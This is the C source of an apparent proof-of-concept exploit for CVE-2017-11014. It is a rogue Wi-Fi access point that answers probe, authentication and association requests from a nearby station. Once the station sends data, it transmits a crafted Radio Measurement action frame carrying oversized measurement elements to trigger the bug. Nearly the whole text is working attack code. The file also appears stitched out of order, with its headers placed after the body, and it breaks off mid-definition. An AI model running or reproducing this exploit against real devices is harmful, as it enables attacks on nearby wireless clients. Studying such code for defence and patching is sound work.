struct ieee80211_assoc_response {
	u_int16_t caps;
	u_int16_t status;
	u_int16_t id;
} __attribute__((__packed__));
typedef struct ieee80211_assoc_response assoc_resp_t;


struct ieee80211_action {
	u_int8_t category;
	u_int8_t action;
	u_int8_t dialog;
	u_int16_t repetitions;
} __attribute__((__packed__));
typedef struct ieee80211_action action_t;


void timespec_diff(struct timespec *newer, struct timespec *older, struct timespec *diff);

char *mac_string(u_int8_t *mac);
void hexdump(const u_char *ptr, u_int len);
char *ssid_string(ie_t *ie);

ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left);
u_int16_t get_sequence(void);

int start_pcap(pcap_t **pcap);
int open_raw_socket(void);
int set_channel(void);

int handle_packet(const u_char *data, u_int32_t left);
int process_periodic_tasks(void);

int process_radiotap(const u_char **ppkt, u_int32_t *pleft);
dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft);
int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);
int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);
int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);

int send_beacon();
int send_probe_response(u_int8_t *dst_mac);
int send_auth_response(u_int8_t *dst_mac);
int send_assoc_response(u_int8_t *dst_mac);
int send_exploit_trigger(u_int8_t *dst_mac);


void usage(char *argv0)
{
	fprintf(stderr, "usage: %s [options] <ssid>\n", argv0);
	fprintf(stderr, "\nsupported options:\n\n"
			"-b             send beacons regularly (default: off)\n"
			"-c <channel>   use the specified channel (default: %d)\n"
			"-i <interface> interface to use for monitoring/injection (default: %s)\n"
			"-m <mac addr>  use the specified mac address (default: from phys)\n"
			, DEFAULT_CHANNEL, g_iface);
}


/*
 * The main function of this program simply checks prelimary arguments and
 * and launches the attack.
 */
int main(int argc, char *argv[])
{
	char *argv0;
	int ret = 0, c;
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;

	/* initalize stuff */
	srand(getpid());
	strcpy(g_iface, "mon0");

	argv0 = "jfap";
	if (argv && argc > 0 && argv[0])
		argv0 = argv[0];

	if (argc < 2) {
		usage(argv0);
		return 1;
	}

	while ((c = getopt(argc, argv, "bc:i:m:")) != -1) {
		switch (c) {
			case '?':
			case 'h':
				usage(argv0);
				return 1;

			case 'b':
				g_send_beacons = 1;
				break;

			case 'c':
				{
					int tmp = atoi(optarg);
					if (tmp < 1 || tmp > 12) {
						fprintf(stderr, "[!] invalid channel: %s\n", optarg);
						return 1;
					}

					g_channel = tmp;
				}
				break;

			case 'i':
				strncpy(g_iface, optarg, sizeof(g_iface) - 1);
				break;

			case 'm':
				{
					struct ether_addr *pe;

					pe = ether_aton(optarg);
					if (!pe) {
						fprintf(stderr, "[!] invalid mac address: %s\n", optarg);
						return 1;
					}
					memcpy(g_bssid, pe->ether_addr_octet, ETH_ALEN);
				}
				break;

			default:
				fprintf(stderr, "[!] invalid option '%c'! try -h ...\n", c);
				return 1;
				/* not reached */
				break;
		}
	}

	/* adjust params */
	argc -= optind;
	argv += optind;

	/* process required arguments */
	if (argc < 1) {
		usage(argv0);
		return 1;
	}

	strncpy((char *)g_ssid, argv[0], sizeof(g_ssid) - 1);
	g_ssid_len = strlen((char *)g_ssid);

	printf("[*] Starting access point with SSID \"%s\" via interface \"%s\"\n",
			g_ssid, g_iface);

	if (!start_pcap(&pch))
		return 1;

	if ((g_sock = open_raw_socket()) == -1)
		return 1;

	/* set the channel for the wireless card */
	if (!set_channel())
		return 1;

	while (1) {
		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
		if (pcret == -1) {
			pcap_perror(pch, "[!] Failed to get a packet");
			continue;
		}

		/* if we got a packet, process it */
		if (pcret == 1) {
			/* check the length against the capture length */
			if (pchdr->len > pchdr->caplen)
				fprintf(stderr, "[-] WARNING: truncated frame! (len: %lu > caplen: %lu)\n",
						(ulong)pchdr->len, (ulong)pchdr->caplen);

			if (!handle_packet(inbuf, pchdr->caplen)) {
				ret = 1;
				break;
			}
		}

		if (!process_periodic_tasks()) {
			ret = 1;
			break;
		}
	}

	pcap_close(pch);
	return ret;
}


/*
 * handle a single packet from the wifi nic
 */
int handle_packet(const u_char *data, u_int32_t left)
{
	dot11_frame_t *d11;

	if (!process_radiotap(&data, &left))
		return 1; /* treat errors as warnings */

	if (!(d11 = get_dot11_frame(&data, &left)))
		return 1; /* treat errors as warnings */

	/* ignore anything from us */
	if (!memcmp(d11->src_mac, g_bssid, ETH_ALEN))
		return 1; /* finished with this packet */

	/* handle retransmissions */
	if (d11->ctrlflags & CF_RETRY) {
		/* if we have a packet that we tried to send, re-send it now */
		if (g_pkt_len > 0) {
			/* don't retransmit too fast */
			struct timespec now, diff;

			if (clock_gettime(CLOCK_REALTIME, &now)) {
				perror("[!] gettimeofday failed");
				return 0;
			}

			/* see how long since the last retransmit. if it's been
			 * long enough, send again */
			timespec_diff(&now, &last_retransmit, &diff);

			if (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 100000) {
#ifdef DEBUG_RETRANSMIT
				printf("[*] Re-transmitting...\n");
#endif
				if (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {
					perror("[!] Unable to re-send packet!");
					/* just try again later */
				}
				last_retransmit = now;
			}
		}

		/* don't process retransmission packets further */
		return 1;
	}

	/* handle broadcast packets - only probe requests */
	if (d11->type == T_MGMT && d11->subtype == ST_PROBE_REQ) {
		if (!process_probe_request(d11, data, left))
			return 1; /* finished with this packet */
		return 1; /* finished with this packet */
	}

	/* from here on out, we only handle unicast packets */
	if (memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {
#ifdef DEBUG_IGNORED
		printf("[*] Ingoring 802.11 packet ver:%u type:%s subtype:%s\n",
				d11->version, dot11_types[d11->type],
				dot11_subtypes[d11->type][d11->subtype]);
		hexdump(data, left);
#endif
		return 1; /* finished with this packet */
	}

	if (d11->type == T_MGMT) {
		if (d11->subtype == ST_AUTH)
			return process_auth_request(d11, data, left);

		else if (d11->subtype == ST_ASSOC_REQ)
			return process_assoc_request(d11, data, left);

	} /* type check */

	else if (d11->type == T_DATA) {
		g_state = S_ESTABLISHED;
		g_pkt_len = 0;
#ifndef DEBUG_DATA
		printf("[*] Station successfully associated and is sending data...\n");
#else
		printf("[*] Unhandled 802.11 packet ver:%u type:%s subtype:%s%s\n",
				d11->version, dot11_types[d11->type],
				dot11_subtypes[d11->type][d11->subtype],
				(d11->subtype >> 3) ? " (QoS)" : "");
		hexdump(data, left);
#endif

		if (g_state != S_EXPLOIT_SENT) {
			g_state = S_EXPLOIT_SENT;
			if (!send_exploit_trigger(d11->src_mac))
				return 0;
		}

		return 1;
	}

	/* if we didn't handle this packet somehow, we should display it */
#ifdef DEBUG_DOT11
	printf("[*] Unhandled 802.11 packet ver:%u type:%s subtype:%s\n",
			d11->version, dot11_types[d11->type],
			dot11_subtypes[d11->type][d11->subtype]);
	hexdump(data, left);
#endif

	return 1;
}


/*
 * handle periodic tasks that need to be done
 */
int process_periodic_tasks(void)
{
	if (g_send_beacons) {
		/* we didn't get a pcket yet, do periodic processing */
		struct timespec now, diff;

		if (clock_gettime(CLOCK_REALTIME, &now)) {
			perror("[!] clock_gettime failed");
			return 0;
		}

		/* see how long since the last beacon. if it's been long enough,
		 * send another */
		timespec_diff(&now, &last_beacon, &diff);
		if (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 1000000) {
#ifdef DEBUG_BEACON_INTERVAL
			printf("%lu.%lu - %lu.%lu = %lu.%lu (vs %lu)\n",
					(ulong)now.tv_sec, now.tv_nsec,
					(ulong)last_beacon.tv_sec, last_beacon.tv_nsec,
					(ulong)diff.tv_sec, diff.tv_nsec,
					(ulong)BEACON_INTERVAL * 1000000);
#endif
			if (!send_beacon())
				return 1; /* treat error as warning */
			last_beacon = now;
		}
	} /* if (g_send_beacons) */

	return 1;
}


/*
 * try to start capturing packets from the specified interface (a wireless card
 * in monitor mode)
 *
 * on succes, we return 1, on failure, 0
 */
int start_pcap(pcap_t **pcap)
{
	char errorstr[PCAP_ERRBUF_SIZE];
	int datalink;

	printf("[*] Starting capture on \"%s\" ...\n", g_iface);

	*pcap = pcap_open_live(g_iface, SNAPLEN, 8, 25, errorstr);
	if (*pcap == (pcap_t *)NULL) {
		fprintf(stderr, "[!] pcap_open_live() failed: %s\n", errorstr);
		return 0;
	}

	datalink = pcap_datalink(*pcap);
	switch (datalink) {
		case DLT_IEEE802_11_RADIO:
			break;

		default:
			fprintf(stderr, "[!] Unknown datalink for interface \"%s\": %d\n",
					g_iface, datalink);
			fprintf(stderr, "    Only RADIOTAP is currently supported.\n");
			return 0;
	}

	return 1;
}


/*
 * open a raw socket that we can use to send raw 802.11 frames
 */
int open_raw_socket(void)
{
	int sock;
	struct sockaddr_ll la;
	struct ifreq ifr;

	sock = socket(PF_PACKET, SOCK_RAW, ETH_P_ALL);
	if (sock == -1) {
		perror("[!] Unable to open raw socket");
		return -1;
	}

	/* build the link-level address struct for binding */
	memset(&la, 0, sizeof(la));
	la.sll_family = AF_PACKET;
	la.sll_halen = ETH_ALEN;

	/* get the interface index */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, g_iface, IFNAMSIZ);
	if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
		perror("[!] Unable to get interface index");
		close(sock);
		return -1;
	}
#ifdef DEBUG_IF_INDEX
	printf("[*] Interface index: %u\n", ifr.ifr_ifindex);
#endif
	la.sll_ifindex = ifr.ifr_ifindex;

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		perror("[!] Unable to get hardware address");
		close(sock);
		return -1;
	}
#ifdef DEBUG_IF_HWADDR
	printf("[*] Interface hardware address: %s\n", mac_string((u_int8_t *)ifr.ifr_hwaddr.sa_data));
#endif
	if (!memcmp(g_bssid, "\x00\x00\x00\x00\x00\x00", ETH_ALEN))
		memcpy(g_bssid, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	 memcpy(la.sll_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	 /* verify the interface uses RADIOTAP */
	 if (ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_RADIOTAP) {
		 fprintf(stderr, "[!] bad address family: %u\n", ifr.ifr_hwaddr.sa_family);
		 close(sock);
		 return -1;
	 }

	 /* bind this socket to the interface */
	 if (bind(sock, (struct sockaddr *)&la, sizeof(la)) == -1) {
		perror("[!] Unable to bind to interface");
		close(sock);
		return -1;
	}
	return sock;
}


/*
 * set the channel of the wireless card
 */
int set_channel(void)
{
	char cmd[256] = { 0 };

	snprintf(cmd, sizeof(cmd) - 1, "iwconfig %s channel %d", g_iface, g_channel);
	if (system(cmd))
		return 0;
	return 1;
}


/*
 * process the radiotap header
 */
int process_radiotap(const u_char **ppkt, u_int32_t *pleft)
{
	const u_char *p = *ppkt;
	radiotap_t *prt = (radiotap_t *)p;
#ifdef DEBUG_RADIOTAP_PRESENT
	int idx = 0;
	u_int32_t *pu = &prt->it_present;
#endif

	if (*pleft < sizeof(radiotap_t)) {
		fprintf(stderr, "[!] Packet doesn't have enough data for a radiotap header?!\n");
		return 0;
	}

#ifdef DEBUG_RADIOTAP
	printf("[*] got RADIOTAP packet - ver:%u pad:%u len:%u\n",
			prt->it_version, prt->it_pad, prt->it_len);
#endif
	if (*pleft <= prt->it_len) {
		fprintf(stderr, "[!] Packet is too small to contain the radiotap header and data\n");
		return 0;
	}

#ifdef DEBUG_RADIOTAP_PRESENT
	printf("    present[%u]: 0x%lx\n", idx, (ulong)prt->it_present);
	while (prt->it_present & 0x1) {
		++idx;
		printf("    present[%u]: 0x%lx\n", idx, (ulong)pu[idx]);
	}
#endif

	*ppkt = p + prt->it_len;
	*pleft -= prt->it_len;

	return 1;
}


/*
 * process the 802.11 frame
 */
dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft)
{
	const u_char *p = *ppkt;

	if (*pleft < sizeof(dot11_frame_t)) {
#ifdef DEBUG_DOT11_SHORT_PKTS
		fprintf(stderr, "[-] Not enough data for 802.11 frame header (bytes left: %u)!\n", *pleft);
		hexdump(p, *pleft);
#endif
		return NULL;
	}

	*ppkt = p + sizeof(dot11_frame_t);
	*pleft -= sizeof(dot11_frame_t);

	return (dot11_frame_t *)p;
}


/*
 * process an 802.11 probe request
 */
int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	ie_t *ie;
	char ssid_req[32] = { 0 };

	if (!(ie = get_ssid_ie(data, left))) {
		fprintf(stderr, "[-] Probe request with no SSID encountered!\n");
		return 1; /* just a warning */
	}

	/* the ssid might be empty, or might be too long */
	if (ie->len > 0)
		strcpy(ssid_req, ssid_string(ie));

	/* there are broadcast and unicast probe requests... */
	if (!memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {
		/* for us!? */
#ifndef DONT_CHECK_SSID_ON_UNICAST
		if (!strcmp(ssid_req, (char *)g_ssid)) {
			printf("[*] (%s) Probe request for our BSSID and SSID, replying...\n", mac_string(d11->src_mac));
			g_state = S_SENT_PROBE_RESP;
			if (!send_probe_response(d11->src_mac))
				return 1; /* treat send errors as a warning */
		}
#else
		printf("[*] (%s) Probe request for our BSSID, replying...\n", mac_string(d11->src_mac));
		g_state = S_SENT_PROBE_RESP;
		if (!send_probe_response(d11->src_mac))
			return 1; /* treat send errors as a warning */
#endif
	} else if (!memcmp(d11->dst_mac, IEEE80211_BROADCAST_ADDR, ETH_ALEN)) {
		/* broadcast probe request - discovery? */
		/* NOTE: this is the active-scan equivalent of a beacon -- no state change here */
		if (ie && ie->len > 0) {
			/* we must check the SSID on broadcast probes */
			if (!strcmp(ssid_req, (char *)g_ssid)) {
				printf("[*] (%s) Broadcast probe request for our SSID \"%s\" received, replying...\n", mac_string(d11->src_mac), ssid_req);
				if (!send_probe_response(d11->src_mac))
					return 1; /* treat send errors as a warning */
			} else {
				printf("[*] (%s) Broadcast probe request for \"%s\" received, NOT replying...\n", mac_string(d11->src_mac), ssid_req);
			}
		} else {
			printf("[*] (%s) Broadcast probe request received, replying...\n", mac_string(d11->src_mac));
			if (!send_probe_response(d11->src_mac))
				return 1; /* treat send errors as a warning */
		}
	} /* mac check */
	else {
		if (ie->len > 0) {
			printf("[*] (%s) Unhandled probe request for SSID (%u bytes): \"%s\"\n", mac_string(d11->src_mac), ie->len, ssid_req);
		} else {
			printf("[*] (%s) Unhandled probe request for empty SSID\n", mac_string(d11->src_mac));
		}
	}
	return 1;
}


/*
 * process an 802.11 authentication request
 */
int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	auth_t *auth;

	if (left < sizeof(auth_t)) {
		fprintf(stderr, "[-] (%s) Auth request without parameters!\n", mac_string(d11->src_mac));
		return 1;
	}

	auth = (auth_t *)data;
	if (auth->seq != 1) {
		fprintf(stderr, "[-] Authentication sequence is not 0x0001 !!\n");
	}

	printf("[*] (%s) Auth request received (alg:0x%x, seq:%u, status:%u), replying...\n",
			mac_string(d11->src_mac),
			auth->algorithm, auth->seq, auth->status);

	g_state = S_SENT_AUTH;
	if (!send_auth_response(d11->src_mac))
		return 1; /* treat send errors as a warning */

	return 1;
}


/*
 * process an 802.11 association request destined for us
 */
int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	assoc_req_t *assoc;
	ie_t *ie;

	if (left < sizeof(assoc_req_t)) {
		fprintf(stderr, "[-] (%s) Association request without parameters!\n", mac_string(d11->src_mac));
		return 1;
	}
	assoc = (assoc_req_t *)data;

	data += sizeof(assoc_req_t);
	left -= sizeof(assoc_req_t);

	if (!(ie = get_ssid_ie(data, left))) {
		printf("[*] (%s) Association request without SSID received (caps:0x%x, interval: %u), replying...\n",
				mac_string(d11->src_mac),
				assoc->caps, assoc->interval);
	} else {
		printf("[*] (%s) Association request for \"%s\" received (caps:0x%x, interval: %u), replying...\n",
				mac_string(d11->src_mac),
				ssid_string(ie),
				assoc->caps, assoc->interval);
	}

	g_state = S_SENT_ASSOC_RESP;
	if (!send_assoc_response(d11->src_mac))
		return 1; /* treat send errors as a warning */
	return 1;
}


/*
 * send an 802.11 packet with a bunch of re-transmissions for the fuck of it
 */
int send_packet(dot11_frame_t *d11)
{
	if (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {
		perror("[!] Unable to send packet!");
		return 0;
	}

	/* set the retransmit flag on the 802.11 header */
	d11->ctrlflags |= CF_RETRY;

	return 1;
}


/*
 * fill the radio tap header in for a packet
 */
void fill_radiotap(u_int8_t **ppkt)
{
	u_int8_t *p = *ppkt;
	radiotap_t *prt = (radiotap_t *)p;

	/* fill out the radio tap header */
	prt->it_version = 0;
	prt->it_len = sizeof(*prt) + 1;
	prt->it_present = (1 << IEEE80211_RADIOTAP_RATE);

	p += sizeof(radiotap_t);

	/* add the data rate (data of the radiotap header) */
	*p++ = 0x4;  // 2Mb/s

	*ppkt = p;
}


/*
 * fill the 802.11 frame header
 */
void fill_dot11(u_int8_t **ppkt, u_int8_t type, u_int8_t subtype, u_int8_t *dst_mac)
{
	dot11_frame_t *d11 = (dot11_frame_t *)(*ppkt);

	/* add the 802.11 header */
	d11->version = 0;
	d11->type = type;
	d11->subtype = subtype;
	d11->ctrlflags = 0;
	d11->duration = 0;
	memcpy(d11->dst_mac, dst_mac, ETH_ALEN);
	memcpy(d11->src_mac, g_bssid, ETH_ALEN);
	memcpy(d11->bssid, g_bssid, ETH_ALEN);
	d11->seq = get_sequence();
	d11->frag = 0;

	*ppkt += sizeof(dot11_frame_t);
}


/*
 * fill in an information element
 */
void fill_ie(u_int8_t **ppkt, u_int8_t id, u_int8_t *data, u_int8_t len)
{
	u_int8_t *p = *ppkt;
	ie_t *ie = (ie_t *)p;

	/* add the ssid IE */
	ie->id = id;
	ie->len = len;

	p = (u_int8_t *)(ie + 1);
	memcpy(p, data, len);

	p += len;
	*ppkt = p;
}


/*
 * send a beacon frame to announce our network
 */
int send_beacon()
{
	u_int8_t pkt[4096] = { 0 }, *p = pkt;
	beacon_t *bc;

	fill_radiotap(&p);
	fill_dot11(&p, T_MGMT, ST_BEACON, IEEE80211_BROADCAST_ADDR);

	/* add the beacon info */
	bc = (beacon_t *)p;
	bc->timestamp = 0;
	bc->interval = BEACON_INTERVAL;
	bc->caps = 1; // we are an AP ;-)
	p = (u_int8_t *)(bc + 1);

	fill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);
	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	fill_ie(&p, IEID_DSPARAMS, &g_channel, 1);

	/* don't retransmit beacons */
	if (send(g_sock, pkt, p - pkt, 0) == -1) {
		perror("[!] Unable to send beacon!");
		return 0;
	}

	//printf("[*] Sent beacon!\n");
	return 1;
}


/*
 * send a probe response to the specified sender
 */
int send_probe_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	beacon_t *bc;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_PROBE_RESP, dst_mac);

	/* add the beacon info */
	bc = (beacon_t *)p;
	bc->timestamp = 0;
	bc->interval = BEACON_INTERVAL;
	bc->caps = 1; // we are an AP ;-)
	p = (u_int8_t *)(bc + 1);

	fill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);
	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	fill_ie(&p, IEID_DSPARAMS, &g_channel, 1);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent probe response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an authentication response
 */
int send_auth_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	auth_t *auth;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_AUTH, dst_mac);

	/* add the auth info */
	auth = (auth_t *)p;
	auth->algorithm = 0; // AUTH_OPEN;
	auth->seq = 2; // should be responding to auth seq 1
	auth->status = 0; // successful
	p = (u_int8_t *)(auth + 1);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent auth response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an association response
 */
int send_assoc_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	assoc_resp_t *assoc;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_ASSOC_RESP, dst_mac);

	/* add the assoc info */
	assoc = (assoc_resp_t *)p;
	assoc->caps = 1;
	assoc->status = 0; // successful
	assoc->id = 1;
	p = (u_int8_t *)(assoc + 1);

	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent association response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an action frame containing a trigger for the exploit
 */
int send_exploit_trigger(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	action_t *action;
	int i;
	u_int8_t measure_data[] = {
		0xff, 0xff, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 0x00,
		0x00, 0xAA, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, /* 16 */
		0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 32 */
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 48 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 64 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 80 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 96 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 112 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA  /* 128 */
	};

	fill_radiotap(&p);
	fill_dot11(&p, T_MGMT, ST_ACTION, dst_mac);

	action = (action_t *)p;
	action->category = 0x05; // Radio Measurement
	action->action = 0x00; // action: Radio Measurement request
	action->dialog = 0x0f; // ??
	action->repetitions = 0; // ??
	p = (u_int8_t *)(action + 1);

	for (i = 0; i < 7; i++) {
		fill_ie(&p, 38, measure_data, sizeof(measure_data));
	}

	g_pkt_len = p - g_pkt;
	if (send(g_sock, g_pkt, g_pkt_len, 0) == -1)
		return 0;

	printf("[*] Sent action frame to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * process the information elements looking for an SSID
 */
ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left)
{
	ie_t *ie;
	const u_int8_t *p = data;
	u_int32_t rem = left;

#ifdef DEBUG_GET_SSID_IE
	printf("[*] processing information element data:\n");
	hexdump(data, left);
#endif

	while (rem > 0) {
		/* see if we have enough for the IE header */
		if (rem < sizeof(*ie)) {
			fprintf(stderr, "[-] Not enough data for an IE!\n");
			return NULL;
		}

		ie = (ie_t *)p;

		/* advance... */
		p += sizeof(*ie);
		rem -= sizeof(*ie);

		/* now, is it an SSID ? */
		if (ie->id == IEID_SSID) {
			return ie;
		}

		/* check if we have all the data */
		if (rem < ie->len) {
			fprintf(stderr, "[-] Not enough data for the IE's data!\n");
			return NULL;
		}

		/* advance past the ie->data */
		p += ie->len;
		rem -= ie->len;
	}

#ifdef DEBUG_GET_SSID_IE
	fprintf(stderr, "[-] SSID IE not found!\n");
#endif
	return NULL;
}


/*
 * create the ascii representation of the specified mac address
 */
char *mac_string(u_int8_t *mac)
{
	static char mac_str[32];
	char *p = mac_str;
	int i;

	for (i = 0; i < ETH_ALEN; i++) {
		u_int8_t hi = mac[i] >> 4;
		u_int8_t lo = mac[i] & 0xf;

		if (hi > 9)
			*p++ = hi - 10 + 'a';
		else
			*p++ = hi + '0';
		if (lo > 9)
			*p++ = lo - 10 + 'a';
		else
			*p++ = lo + '0';
		if (i < ETH_ALEN - 1)
			*p++ = ':';
	}
	*p = '\0';

	return mac_str;
}


/*
 * return the ssid string, ensuring truncation and nul termination
 */
char *ssid_string(ie_t *ie)
{
	static char ssid_str[32];

	memset(ssid_str, 0, sizeof(ssid_str));
	if (ie->len > sizeof(ssid_str) - 1)
		strncpy(ssid_str, (char *)ie->data, sizeof(ssid_str) - 1);
	else
		strncpy(ssid_str, (char *)ie->data, ie->len);
	return ssid_str;
}


/*
 * handle sequence number generation
 */
u_int16_t get_sequence(void)
{
	static u_int16_t sequence = 1337;
	uint16_t ret = sequence;

	sequence++;
	if (sequence > 4095)
		sequence = 0;
	return ret;
}


/*
 * diff two timespec values
 */
void timespec_diff(struct timespec *newer, struct timespec *older, struct timespec *diff)
{
	diff->tv_sec = newer->tv_sec - older->tv_sec;
	diff->tv_nsec = newer->tv_nsec - older->tv_nsec;
	if (diff->tv_nsec < 0) {
		--diff->tv_sec;
		diff->tv_nsec += 1000000000;
	}
}

```

`wifi/CVE-2017-11014.c`:

```c
/*
 * jduck's fake AP for WiFi hax.
 *
 * by Joshua J. Drake (@jduck) on 2017-06-13
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

/* hi-res time */
#include <time.h>

/* internet networking / packet sending */
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <linux/if.h>
#include <linux/if_packet.h>

/* packet capturing */
#include <pcap/pcap.h>


/* global hardcoded parameters */
#define SNAPLEN 4096
#define BEACON_INTERVAL 500
#define DEFAULT_CHANNEL 1


/* some bits borrowed from tcpdump! thanks guys! */
#define T_MGMT 0x0  /* management */
#define T_CTRL 0x1  /* control */
#define T_DATA 0x2  /* data */
#define T_RESV 0x3  /* reserved */

#define ST_ASSOC_REQ 0
#define ST_ASSOC_RESP 1
#define ST_PROBE_REQ 4
#define ST_PROBE_RESP 5
#define ST_BEACON 8
#define ST_AUTH 11
#define ST_ACTION 13

#define CF_RETRY 8

#define IEID_SSID 0
#define IEID_RATES 1
#define IEID_DSPARAMS 3

#define IEEE80211_RADIOTAP_RATE 2

#define IEEE80211_BROADCAST_ADDR ((u_int8_t *)"\xff\xff\xff\xff\xff\xff")


const char *dot11_types[4] = { "mgmt", "ctrl", "data", "resv" };
const char *dot11_subtypes[4][16] = {
	/* mgmt */
	{ "assoc-req", "assoc-resp",
		"re-assoc-req", "re-assoc-resp",
		"probe-req", "probe-resp",
		"6?", "7?",
		"beacon", "atim",
		"dis-assoc", "auth",
		"de-auth", "action",
		"14?", "15?" },
	/* ctrl */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?",
		"8?", "block-ack", "ps-poll", "rts", "cts", "ack", "cf-end", "cf-end-ack" },
	/* data */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?", "8?", "9?", "10?", "11?", "12?", "13?", "14?", "15?" },
	/* reserved */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?", "8?", "9?", "10?", "11?", "12?", "13?", "14?", "15?" }
};

int g_sock;
char g_iface[64];

u_int8_t g_bssid[ETH_ALEN];
u_int8_t g_ssid[32];
u_int8_t g_ssid_len;
u_int8_t g_channel = DEFAULT_CHANNEL;

u_int8_t g_pkt[4096];
size_t g_pkt_len = 0;
struct timespec last_retransmit;

/* global options */
int g_send_beacons = 0;
struct timespec last_beacon;

typedef enum {
	S_AWAITING_PROBE_REQ = 0,
	S_SENT_PROBE_RESP = 1,
	S_SENT_AUTH = 2,
	S_SENT_ASSOC_RESP = 3,
	S_ESTABLISHED = 4,
	S_EXPLOIT_SENT = 5
} state_t;

state_t g_state = S_AWAITING_PROBE_REQ;


struct ieee80211_radiotap_header {
	u_int8_t it_version;      /* set to 0 */
	u_int8_t it_pad;
	u_int16_t it_len;         /* entire length */
	u_int32_t it_present;     /* fields present */
} __attribute__((__packed__));
typedef struct ieee80211_radiotap_header radiotap_t;

struct ieee80211_frame_header {
	u_int version:2;
	u_int type:2;
	u_int subtype:4;
	u_int8_t ctrlflags;
	u_int16_t duration;
	u_int8_t dst_mac[ETH_ALEN];
	u_int8_t src_mac[ETH_ALEN];
	u_int8_t bssid[ETH_ALEN];
	u_int frag:4;
	u_int seq:12;
} __attribute__((__packed__));
typedef struct ieee80211_frame_header dot11_frame_t;

struct ieee80211_beacon {
	u_int64_t timestamp;
	u_int16_t interval;
	u_int16_t caps;
} __attribute__((__packed__));
typedef struct ieee80211_beacon beacon_t;

struct ieee80211_information_element {
	u_int8_t id;
	u_int8_t len;
	u_int8_t data[0];
} __attribute__((__packed__));
typedef struct ieee80211_information_element ie_t;

struct ieee80211_authentication {
	u_int16_t algorithm;
	u_int16_t seq;
